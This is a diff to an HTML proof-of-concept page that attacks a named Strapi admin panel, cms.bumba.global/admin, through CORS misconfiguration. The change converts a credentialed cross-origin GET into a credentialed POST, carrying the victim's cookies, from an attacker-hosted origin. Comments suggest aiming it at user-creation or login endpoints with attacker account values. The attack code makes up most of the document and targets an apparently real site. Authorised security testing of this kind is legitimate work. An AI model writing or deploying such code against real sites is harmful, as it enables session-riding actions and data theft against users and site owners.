@@ -1,9 +1,9 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC for cms.bumba.global/admin</title>
+    <title>CORS PoC (POST) for cms.bumba.global/admin</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
@@ -96,18 +96,20 @@
 <body>
 
     <div class="container">
-        <h1 class="header">CORS PoC for Strapi Admin Panel</h1>
+        <h1 class="header">CORS PoC (POST Request) for Strapi Admin Panel</h1>
         <p class="description">
-            This page, hosted on a different origin (e.g., `attacker.com`), attempts to fetch the content of
+            This page, hosted on a different origin (e.g., `attacker.com`), attempts to make a <strong>POST</strong> request to
             `https://cms.bumba.global/admin`.
             If the target server has a misconfigured CORS policy (e.g., `Access-Control-Allow-Origin: *` and
             `Access-Control-Allow-Credentials: true`),
             the response will be displayed below. Otherwise, the browser will block access due to the Same-Origin Policy.
+            <br><br>
+            <strong>Note:</strong> For a POST request to succeed with CORS, the server must properly respond to a CORS preflight `OPTIONS` request if the request involves "non-simple" headers or content types (e.g., `application/json`).
         </p>
-        <button id="fetchButton" class="button">Attempt Cross-Origin Fetch</button>
+        <button id="fetchButton" class="button">Attempt Cross-Origin POST Request</button>
         <div id="loadingSpinner" class="loading-spinner"></div>
         <div id="result">
-            Click the button to perform the fetch request and see the result here.
+            Click the button to perform the POST request and see the result here.
             <br>
             <br>
             **Important:** Check your browser's developer console (F12 > Console/Network) for detailed CORS errors.
@@ -122,42 +124,79 @@
             resultDiv.className = ''; // Reset classes
             loadingSpinner.style.display = 'block'; // Show spinner
 
-            const targetUrl = 'https://cms.bumba.global/admin';
+            // Target URL for the POST request
+            // For a real attack, this would be an API endpoint that processes POST data,
+            // e.g., a login endpoint, a data submission endpoint, or an action endpoint.
+            const targetUrl = 'https://cms.bumba.global/admin'; // You might want to change this to a more specific POST endpoint
+            // Example: const targetUrl = 'https://cms.bumba.global/api/users'; // If adding a user
+
+            // Data to send in the POST request body
+            // This is just an example. You'll need to know the expected format (JSON, FormData, URLSearchParams)
+            // and the specific parameters the target endpoint expects.
+            const postData = {
+                // Example for JSON:
+                // name: 'attacker_user',
+                // email: 'attacker@example.com',
+                // password: 'securepassword123'
+
+                // Example for URL-encoded form data (similar to how a form would submit):
+                // You'd typically use URLSearchParams for this if not a form
+                // param1: 'value1',
+                // param2: 'value2'
+            };
+
+            // Choose the correct Content-Type header based on your postData format
+            let requestHeaders = {
+                // 'Content-Type': 'application/json' // For JSON data
+                // 'Content-Type': 'application/x-www-form-urlencoded' // For URLSearchParams
+                // 'Content-Type': 'text/plain' // For plain text
+            };
+
+            let requestBody;
+            // Example for JSON body:
+            // requestBody = JSON.stringify(postData);
+            // requestHeaders['Content-Type'] = 'application/json';
+
+            // Example for URL-encoded form data body:
+            // const formData = new URLSearchParams();
+            // formData.append('username', 'eviluser');
+            // formData.append('password', 'pwned');
+            // requestBody = formData.toString();
+            // requestHeaders['Content-Type'] = 'application/x-www-form-urlencoded';
+
+            // For a simple POST to a non-specific /admin endpoint without a body, you could leave body undefined.
+            // However, a POST request usually implies sending data.
+            // Let's default to a simple JSON payload as a common example.
+            postData.action = "test_cors_post"; // Example data for a simple POST
+            requestBody = JSON.stringify(postData);
+            requestHeaders['Content-Type'] = 'application/json';
+
 
             try {
-                // The 'credentials: "include"' is crucial here. It ensures that
-                // cookies (including session cookies for cms.bumba.global) are sent
-                // with the cross-origin request.
                 const response = await fetch(targetUrl, {
-                    method: 'GET',
-                    credentials: 'include' // This sends cookies with the cross-origin request
+                    method: 'POST', // Changed from 'GET' to 'POST'
+                    headers: requestHeaders, // Include your content-type header
+                    body: requestBody, // Include the data payload for the POST request
+                    credentials: 'include' // Still crucial for sending cookies
                 });
 
                 if (response.ok) {
-                    // If the response is OK, try to read the text.
-                    // The browser will only allow this if the CORS policy is permissive.
                     const text = await response.text();
                     resultDiv.classList.add('success');
-                    resultDiv.textContent = `Successfully fetched content (CORS allowed):\n\n${text.substring(0, 1000)}... (truncated)`; // Show first 1000 chars
+                    resultDiv.textContent = `Successfully performed POST request (CORS allowed):\n\n${text.substring(0, 1000)}... (truncated)`;
                     console.log('Full response text:', text);
                 } else {
-                    // If response.ok is false, it means the server responded with an error status,
-                    // but the request itself might have been allowed by CORS.
                     const errorText = await response.text();
                     resultDiv.classList.add('error');
-                    resultDiv.textContent = `Fetch failed with status ${response.status} ${response.statusText}.\n\nResponse content (if readable due to CORS):\n${errorText.substring(0, 500)}... (truncated)`;
-                    console.error(`Fetch failed: ${response.status} ${response.statusText}`, errorText);
+                    resultDiv.textContent = `POST request failed with status ${response.status} ${response.statusText}.\n\nResponse content (if readable due to CORS):\n${errorText.substring(0, 500)}... (truncated)`;
+                    console.error(`POST failed: ${response.status} ${response.statusText}`, errorText);
                 }
             } catch (error) {
-                // This catch block will execute if the network request fails,
-                // or more commonly, if the browser's Same-Origin Policy blocks
-                // reading the response due to a strict CORS policy.
                 resultDiv.classList.add('error');
-                resultDiv.textContent = `CORS Error or Network Issue: ${error.message}.
-                \n\nThis often means the target server's CORS policy prevented this page from reading the response.
-                \nCheck your browser's developer console (F12 -> Console/Network tab) for details,
-                especially for messages like 'Cross-Origin Read Blocking (CORB)' or 'Access to fetch has been blocked by CORS policy'.`;
-                console.error('CORS fetch error:', error);
+                resultDiv.textContent = `CORS Error or Network Issue during POST: ${error.message}.
+                \n\nThis often means the target server's CORS policy prevented this page from reading the response, or denied the preflight request.
+                \nCheck your browser's developer console (F12 -> Console/Network tab) for details.`;
+                console.error('CORS POST fetch error:', error);
             } finally {
                 loadingSpinner.style.display = 'none'; // Hide spinner
             }
